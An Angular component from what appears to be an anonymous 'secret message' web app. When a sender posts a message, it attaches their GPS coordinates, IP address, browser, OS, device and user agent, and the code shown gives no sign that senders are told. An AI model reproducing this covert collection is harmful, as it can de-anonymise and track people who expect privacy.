import { Component, OnInit } from '@angular/core';
import { MatDialog } from '@angular/material/dialog';
import { ActivatedRoute, Router } from '@angular/router';
import { map } from 'rxjs/operators';
import { DialogComponent } from 'src/app/components/dialog/dialog.component';
import { GenericService } from 'src/app/services/generic.service';
import { GlobalService } from 'src/app/services/global.service';
import { environment } from 'src/environments/environment';
import { MessageReviewComponent } from '../message-review/message-review.component';

@Component({
  selector: 'app-sent-message',
  templateUrl: './sent-message.component.html',
  styleUrls: ['./sent-message.component.scss'],
})
export class SentMessageComponent implements OnInit {
  public msg: string = '';
  userId: any = '';
  public displayName: any = '';
  public msgSendFlag: boolean = false;
  public endPoints: any = '';

  constructor(
    private _generic: GenericService,
    private _global: GlobalService,
    private _route: ActivatedRoute,
    private _router: Router,
    private _dialog: MatDialog
  ) {
    _route.params.pipe(map((p) => p.id)).subscribe((res) => {
      if (res) {
        _global.userId = res;
      } else {
        this._router.navigate(['/secret-message/create']);
      }
    });
  }

  ngOnInit(): void {
    this._global.watchPosition();
    this.getUserDetails();
  }

  getUserDetails(): void {
    const url = 'user-details/' + atob(this._global.userId);
    console.log(url);
    this._generic.get(url).subscribe((res: any) => {
      console.log(res);
      if (res['Status']) {
        if (res['Data']) {
          if (localStorage.getItem('token')) {
            localStorage.setItem(
              'token-previous',
              String(localStorage.getItem('token'))
            );
            localStorage.setItem('token', res.Data[0].token);
          } else {
            localStorage.setItem('token', res.Data[0].token);
          }
          this.userId = res.Data[0]._id;
          this.displayName = res.Data[0].displayname;
          this.displayName = this.displayName
            ? `Send your secret message to ${this.displayName}`
            : '';
          this.endPoints = res.Data[1].endpoints;
        }
      }
    });
  }

  sentMessage(msg: string) {
    console.log(msg);
    if (msg != '') {
      const url = 'savemessages';
      let ipAdd: any = '';
      this._global.ipAddress.subscribe((res) => {
        ipAdd = res;
      });
      let data = {
        userid: this.userId,
        message: msg,
        longitude: this._global.longitude,
        latitude: this._global.latitude,
        browser: this._global.deviceInfo['browser'],
        browser_version: this._global.deviceInfo['browser_version'],
        device: this._global.deviceInfo['device'],
        deviceType: this._global.deviceInfo['deviceType'],
        orientation: this._global.deviceInfo['orientation'],
        os: this._global.deviceInfo['os'],
        os_version: this._global.deviceInfo['os_version'],
        userAgent: this._global.deviceInfo['userAgent'],
        ip: ipAdd,
        endpoints: this.endPoints,
      };

      this._generic.post(url, data).subscribe(
        (res: any) => {
          console.log(res);
          if (res['Status']) {
            this.msg = '';
            this.msgSendFlag = true;
            this._global.openSnackbar(res.Message, 'success');
            // this._dialog.open(DialogComponent);
          } else {
            this._global.openSnackbar(res.Message, 'error');
          }
        },
        (err) => {
          this._global.openSnackbar(err.Message, 'success');
        }
      );
      // this._dialog.open(MessageReviewComponent, {
      //   data: {
      //     params: data,
      //   }
      // }).afterClosed().subscribe((res)=> {
      //   this.msgSendFlag = res;
      // })
    } else {
      this._global.openSnackbar(
        `Write Something to ${
          this.displayName != undefined ? this.displayName : ''
        }`,
        'error'
      );
    }
  }
}
